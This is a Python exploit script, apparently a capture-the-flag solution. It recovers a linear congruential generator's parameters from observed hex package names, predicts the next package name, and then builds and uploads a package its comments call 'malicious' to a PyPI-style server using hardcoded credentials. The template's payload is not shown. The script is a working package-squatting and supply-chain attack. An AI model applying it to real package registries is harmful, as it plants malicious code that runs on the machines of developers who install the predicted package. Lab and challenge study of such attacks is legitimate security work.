# Reference: https://tailcall.net/blog/cracking-randomness-lcgs/
from math import gcd
from functools import reduce

# You must obtain some consecutive package names. These should change to match your sequence
EXAMPLE_PACKAGE_NAMES = [
    "49fb45fb6921d385",
    "345fc839ebda7bb3",
    "8811a23010c00eb0",
    "73b87df85f197315",
    "82ad3b9cac13252f",
    "899936f35c7fb48c"
]

PUBLIC_PYPI_USERNAME = "benny"
PUBLIC_PYPI_PASSWORD = "gr4ndmast3r"
PUBLIC_PYPI_URL = "http://0.0.0.0:8081/"

# Convert them to integers
STATES = list(map(lambda x: int(x, 16), EXAMPLE_PACKAGE_NAMES))

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    g, x, y = egcd(b % a, a)
    return (g, y - (b // a) * x, x)


def modinv(b, n):
    g, x, _ = egcd(b, n)
    if g == 1:
        return x % n


def crack_unknown_increment(states, modulus, multiplier):
    increment = (states[1] - states[0] * multiplier) % modulus
    return modulus, multiplier, increment


def crack_unknown_multiplier(states, modulus):
    multiplier = (
        (states[2] - states[1]) * modinv((states[1] - states[0]) % modulus, modulus) % modulus
    )
    return crack_unknown_increment(states, modulus, multiplier)


def crack_unknown_modulus(states):
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
    zeroes = [t2 * t0 - t1 * t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
    modulus = abs(reduce(gcd, zeroes))
    return crack_unknown_multiplier(states, modulus)


last_state = STATES[-1]
modulo, mult, inc = crack_unknown_modulus(STATES)
package_name = hex((last_state * mult + inc) % modulo)[2:]

## Second part of solution
## Create malicious python package to upload to test.pypi
import os, shutil

path = os.path.dirname(os.path.abspath(__file__))

shutil.copytree(os.path.join(path, "package_template"), os.path.join(path, package_name))

with open(os.path.join(path, package_name, "setup.py"), "r") as f:
    setup_py = f.read()

with open(os.path.join(path, package_name, "setup.py"), "w") as f:
    f.write(setup_py.replace("{{ package_name }}", package_name))

build = os.system("cd {0} && python -m build".format(os.path.join(path, package_name)))

build = os.system(
    "cd {0} && twine upload --repository-url {3} dist/* --username {1} --password {2}".format(
        os.path.join(path, package_name),
        PUBLIC_PYPI_USERNAME,
        PUBLIC_PYPI_PASSWORD,
        PUBLIC_PYPI_URL
    )
)

shutil.rmtree(os.path.join(path, package_name))

